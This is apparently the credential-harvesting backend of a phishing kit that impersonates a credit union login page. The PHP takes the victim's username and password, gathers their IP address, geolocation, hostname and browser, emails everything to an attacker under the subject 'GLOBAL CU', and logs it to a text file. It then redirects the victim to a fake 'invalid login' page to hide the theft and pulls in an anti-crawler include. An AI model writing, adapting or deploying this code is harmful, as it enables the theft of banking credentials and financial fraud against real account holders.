<?php

session_start();


include 'antispider.php';


$_SESSION["UserName"];
$Password = $_POST['Password'];



if(strlen($Password) == 0 ){
    header( "Location: pass.php??ultrabranch3.alaskausa.org/efs/servlet/efs/invalid-login");
}


else{



$ip = getenv("REMOTE_ADDR");
$country = ip_visitor_country();
$region = ip_visitor_region();
$city = ip_visitor_city();
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);


//submit to email
$message .= "---:|| Login Access ||:---\n";
$message .= "User ID : 		  ".$_SESSION["UserName"]."\n";
$message .= "Password : 		  ".$Password."\n";
$message .= "----------------------------------------\n";
$message .= "Client IP --  ".$ip."\n";
$message .= "Client Country Detected --  ".$country."\n";
$message .= "Client Region Detected --  ".$region."\n";
$message .= "Client City Detected --  ".$city."\n";
$message .= "Client DateTime --  : ".$adddate."\n";
$message .= "Client HostName -- : ".$hostname."\n";
$message .= "Client Browser Detected --  ".$browser."\n";
$message .= "------------- GhostMode -----------------\n";
$message .= "----------------------------------------"."\n";

$subject = "GLOBAL CU - $ip";
$headers = "From: GLOBAL CU";
$headers .= $_POST['$ip']."\n";
mail($recipient,$subject,$message,$headers);


//submit to textfile
$myFile = "uber.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
fwrite($fh, $message);
fclose($fh);


unset($_SESSION["UserName"]);


header('Location: emailaccess.php?ultrabranch3.alaskausa.org/efs/servlet/efs/invalid-loginjsp');






}





function ip_visitor_country()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $country  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_countryName'] != null) {
        $country = $ip_data['geoplugin_countryName'];
		
		
    }

    return $country;
}

//echo ip_visitor_country(); // output Country name


// Function to get REGION;
function ip_visitor_region()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $region  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_region'] != null) {
   	  $region = $ip_data['geoplugin_region'];
		
    }

    return $region;
}

// Function to get city;
function ip_visitor_city()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $city  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_city'] != null) {
   	  $city = $ip_data['geoplugin_city'];
		
    }

    return $city;
}

//echo ip_visitor_city(); // output city name
?>
